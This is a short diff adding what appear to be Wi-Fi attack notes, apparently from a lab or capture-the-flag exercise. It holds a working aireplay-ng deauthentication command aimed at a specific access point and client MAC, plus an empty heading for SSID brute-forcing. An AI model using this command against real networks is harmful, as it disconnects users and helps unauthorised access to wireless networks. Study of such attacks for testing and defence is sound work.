@@ -1,0 +1,6 @@
+# Option-1: Deauth
+# airodump and then send deauth with airplay
+
+sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
+
+# Option-2: Bruteforcing SSID
